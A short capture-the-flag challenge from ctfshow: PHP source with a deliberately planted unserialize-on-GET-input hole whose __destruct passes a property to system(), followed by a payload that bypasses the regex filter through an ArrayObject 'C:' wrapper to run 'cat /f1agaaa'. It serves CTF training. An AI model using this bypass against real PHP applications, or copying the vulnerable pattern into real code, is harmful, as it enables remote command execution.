~~~
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2023-03-24 10:16:33
# @Last Modified by:   h1xa
# @Last Modified time: 2023-03-25 00:25:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
highlight_file(__FILE__);

class ctfshow{

    public function __wakeup(){
        die("not allowed!");
    }

    public function __destruct(){
        system($this->ctfshow);
    }

}

$data = $_GET['1+1>2'];

if(!preg_match("/^[Oa]:[\d]+/i", $data)){
    unserialize($data);
}
?>
~~~
payload:
~~~
?1%2b1>2=C:11:"ArrayObject":67:{x:i:0;O:7:"ctfshow":1:{s:7:"ctfshow";s:12:"cat /f1agaaa";};m:a:0:{}}
~~~
